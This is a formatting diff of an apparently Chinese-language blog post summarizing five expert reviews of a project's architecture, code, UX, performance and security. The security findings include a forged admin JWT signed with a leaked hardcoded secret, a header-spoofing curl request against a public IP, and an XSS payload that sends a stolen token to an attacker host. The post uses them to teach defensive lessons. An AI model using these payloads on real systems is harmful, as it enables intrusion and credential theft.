@@ -10,13 +10,13 @@
 
 把五位专家的盲审分数摆在一起,你会看到一张反差极大的雷达图:
 
-| 维度 | 评审人 | 分数 |
-|------|--------|------|
-| 架构 | 系统架构师 (前 AWS 首席) | **8.0 / 10** |
-| 代码质量 | Staff Engineer | **7.4 / 10** |
-| UX/产品 | 前 Notion PM | **7.0 / 10** |
-| 性能 / SRE | Netflix 级 SRE | **4.0 / 10** |
-| 安全 | OWASP 红蓝队 | **3.0 / 10**(合规等级 D) |
+| 维度       | 评审人                   | 分数                     |
+| ---------- | ------------------------ | ------------------------ |
+| 架构       | 系统架构师 (前 AWS 首席) | **8.0 / 10**             |
+| 代码质量   | Staff Engineer           | **7.4 / 10**             |
+| UX/产品    | 前 Notion PM             | **7.0 / 10**             |
+| 性能 / SRE | Netflix 级 SRE           | **4.0 / 10**             |
+| 安全       | OWASP 红蓝队             | **3.0 / 10**(合规等级 D) |
 
 一句话定调:**这是一个被认真想过的"轴"撑起来的系统,在能用脑子解决的维度上拿了高分(架构、代码、UX),在需要"工程纪律 + 时间"去打磨的维度上(性能、安全)摔得很惨**。
 
@@ -67,7 +67,7 @@ notifications
 
 ```ts
 // apps/backend/src/kg-rebuild.ts:8
-DERIVED_EDGE_TYPES = ["REF", "ANCHORED_TO", "CONFLICTS_WITH", "OVERLAPS_WITH"]
+DERIVED_EDGE_TYPES = ["REF", "ANCHORED_TO", "CONFLICTS_WITH", "OVERLAPS_WITH"];
 ```
 
 任何时候你可以 `POST /api/kg/rebuild`,**全擦掉,全重算**,原始数据零损失。这是一个非常稳健的设计:派生数据是无状态的,可重放的。
@@ -126,7 +126,9 @@ Staff Engineer 给的 **7.4 分**很有意思——后端和共享层稳定在 S
 ```ts
 // apps/backend/src/cli-core.ts
 export interface CliCommand {
-  name: string; summary: string; usage: string;
+  name: string;
+  summary: string;
+  usage: string;
   build: (pos: string[], opts: Record<string, string | boolean>) => HttpRequest;
 }
 ```
@@ -357,13 +359,13 @@ GIN(Generalized Inverted Index)对 JSONB 的 `@>` 包含查询是 O(log N) 的,*
 
 SRE 给了一张收益预估表:
 
-| 查询 | SQLite 现状 | PG + JSONB + GIN | 倍数 |
-|------|-------------|------------------|------|
-| `queryNodes(attackTicket, {状态: "处理中"})` @ 10k 节点 | ~300ms | ~5-15ms | **20-60×** |
-| `queryNodes(person, {邮箱: x})` @ 5k 人 | ~80-200ms × N | ~1-3ms | **30-100×** |
-| Hermes fallback 全文搜索 | ~1.5-3s | ~10-50ms | **30-300×** |
-| Dashboard 加载 | ~500-1500ms | 50-150ms | **10×** |
-| 并发写 QPS | <50(全局锁) | ~1k(MVCC) | **20×** |
+| 查询                                                    | SQLite 现状   | PG + JSONB + GIN | 倍数        |
+| ------------------------------------------------------- | ------------- | ---------------- | ----------- |
+| `queryNodes(attackTicket, {状态: "处理中"})` @ 10k 节点 | ~300ms        | ~5-15ms          | **20-60×**  |
+| `queryNodes(person, {邮箱: x})` @ 5k 人                 | ~80-200ms × N | ~1-3ms           | **30-100×** |
+| Hermes fallback 全文搜索                                | ~1.5-3s       | ~10-50ms         | **30-300×** |
+| Dashboard 加载                                          | ~500-1500ms   | 50-150ms         | **10×**     |
+| 并发写 QPS                                              | <50(全局锁)   | ~1k(MVCC)        | **20×**     |
 
 但是——并不是所有"慢"都能换 DB 救。
 
@@ -393,8 +395,7 @@ repo.deleteEdges({ edgeType: "OVERLAPS_WITH" }, actor);
 
 ```ts
 for (let i = 0; i < nodes.length; i++)
-  for (let j = i + 1; j < nodes.length; j++)
-    const dist = levenshtein(A.key, B.key);  // O(L²)
+  for (let j = i + 1; j < nodes.length; j++) const dist = levenshtein(A.key, B.key); // O(L²)
 ```
 
 1k persons = **499,500 次 levenshtein**,每次 L≈10 字符 → ~5 千万 cell 操作。5k 人时直接卡死 jobs。
@@ -422,14 +423,14 @@ useEffect(() => {
 
 SRE 评审给出了简洁的判别法。我把它整理成一张表:
 
-| 症状 | DB 问题 | 算法问题 |
-|------|---------|----------|
-| 数据量大 1 倍,延迟大 1 倍 | ✓ | (线性问题,通常 DB) |
-| 数据量大 1 倍,延迟大 4 倍 | × | ✓(O(N²)) |
-| 加索引后 100× 提升 | ✓ | × |
-| 加缓存后大幅提升 | 可能(读多写少) | ✓(重计算) |
-| 单条慢查询 EXPLAIN 显示 seq scan | ✓ | × |
-| 慢查询 EXPLAIN 看起来正常,但 QPS 上不去 | × | ✓ |
+| 症状                                    | DB 问题        | 算法问题           |
+| --------------------------------------- | -------------- | ------------------ |
+| 数据量大 1 倍,延迟大 1 倍               | ✓              | (线性问题,通常 DB) |
+| 数据量大 1 倍,延迟大 4 倍               | ×              | ✓(O(N²))           |
+| 加索引后 100× 提升                      | ✓              | ×                  |
+| 加缓存后大幅提升                        | 可能(读多写少) | ✓(重计算)          |
+| 单条慢查询 EXPLAIN 显示 seq scan        | ✓              | ×                  |
+| 慢查询 EXPLAIN 看起来正常,但 QPS 上不去 | ×              | ✓                  |
 
 简单粗暴的判断: **算复杂度**。N² 永远是算法问题,O(N log N) 走索引基本是 DB 问题。
 
@@ -473,7 +474,7 @@ const JWT_SECRET = process.env.JWT_SECRET || "combat-platform-secret-2026";
 systemd Unit 没有 `Environment=JWT_SECRET=...`,所以**现网用的就是这个公开字符串**。任何看过源码的人(包括看这篇博客的你)都可以本地签发管理员 token:
 
 ```js
-jwt.sign({userId:"admin",role:"admin"}, "combat-platform-secret-2026", {expiresIn:"365d"})
+jwt.sign({ userId: "admin", role: "admin" }, "combat-platform-secret-2026", { expiresIn: "365d" });
 ```
 
 这一条配合 P0-1 是冗余的(都能拿 admin),但即便你修了 P0-1,P0-2 也独立把你打穿。
@@ -521,7 +522,7 @@ curl -H 'X-Role: admin' http://124.156.193.122:3001/api/nodes/contribution -d '.
 `rehypeRaw` 让 markdown 中 `<script>`、`<img onerror>`、`<iframe>` 等原始 HTML **直接执行**。任意登录用户可以在攻关单的动态 Tab 里存:
 
 ```html
-<img src=x onerror="fetch('https://attacker/x?'+localStorage.getItem('combat-token'))">
+<img src="x" onerror="fetch('https://attacker/x?'+localStorage.getItem('combat-token'))" />
 ```
 
 受害者打开页面 → token 走人。组合 P0-1(任意注册) + P0-5(XSS 盗 token),形成**完整的 RCE → token → 提权链**。
@@ -546,11 +547,11 @@ curl -H 'X-Role: admin' http://124.156.193.122:3001/api/nodes/contribution -d '.
 
 这是个人项目 → 多用户项目 → 公开项目的**典型安全门槛差异**:
 
-| 阶段 | 安全模型 | 关键门槛 |
-|------|----------|----------|
-| 个人项目 | 信任所有人(自己) | 无 |
-| 内网多用户 | 信任已认证用户 | 至少认证 + RBAC + 不信任 client header |
-| 公网多用户 | 不信任任何人 | TLS + WAF + rate-limit + 输入 sanitize + secret 管理 + audit + 监控 |
+| 阶段       | 安全模型         | 关键门槛                                                            |
+| ---------- | ---------------- | ------------------------------------------------------------------- |
+| 个人项目   | 信任所有人(自己) | 无                                                                  |
+| 内网多用户 | 信任已认证用户   | 至少认证 + RBAC + 不信任 client header                              |
+| 公网多用户 | 不信任任何人     | TLS + WAF + rate-limit + 输入 sanitize + secret 管理 + audit + 监控 |
 
 跨越每一级,都需要补一整套安全机制。这个项目从第一级直接跳到了第三级,**没补中间任何一级该补的东西**。
 
@@ -559,6 +560,7 @@ curl -H 'X-Role: admin' http://124.156.193.122:3001/api/nodes/contribution -d '.
 > **★ 读者可以从这里学到什么**
 >
 > 部署到公网 IP 之前,过一遍 OWASP Top 10 是工程纪律的一部分,不是 "等出问题再说"。重点关注 6 类:
+>
 > 1. **认证**: 自注册角色受控,JWT secret 强校验
 > 2. **授权**: 服务端从 JWT 取角色,不信任任何客户端 header / body 里的 role 字段
 > 3. **XSS**: 任何用户可写的富文本都走 sanitize,token 别放 localStorage
@@ -608,13 +610,13 @@ graph TD
 
 如果把"离生产级"做个量化:
 
-| 项目 | 当前 | 目标 | gap |
-|------|------|------|-----|
-| 性能 | 5k 节点 p99 < 1s | 50k 节点 p99 < 500ms | **PG + JSONB + GIN + 算法热点改造** |
-| 安全 | D 级 | B+ 级 | **P0 全修 + helmet + rate-limit + HTTPS + secret 管理** |
-| 可观测性 | 文件日志 | metrics + traces + alert | **Prometheus exporter + Grafana + 告警** |
-| 部署 | 单机 systemd | 蓝绿 / 滚动 | **容器化 + 多副本 + 健康检查** |
-| 协作 | 个人 / 双人 | 团队 (5+) | **ESLint + Prettier + GitHub Actions + PR 模板** |
+| 项目     | 当前             | 目标                     | gap                                                     |
+| -------- | ---------------- | ------------------------ | ------------------------------------------------------- |
+| 性能     | 5k 节点 p99 < 1s | 50k 节点 p99 < 500ms     | **PG + JSONB + GIN + 算法热点改造**                     |
+| 安全     | D 级             | B+ 级                    | **P0 全修 + helmet + rate-limit + HTTPS + secret 管理** |
+| 可观测性 | 文件日志         | metrics + traces + alert | **Prometheus exporter + Grafana + 告警**                |
+| 部署     | 单机 systemd     | 蓝绿 / 滚动              | **容器化 + 多副本 + 健康检查**                          |
+| 协作     | 个人 / 双人      | 团队 (5+)                | **ESLint + Prettier + GitHub Actions + PR 模板**        |
 
 每一栏 2-4 周工作量,五栏并行 6-8 周可以追平。**这不是"重写",这是"补课"**——架构本身不需要动。
 
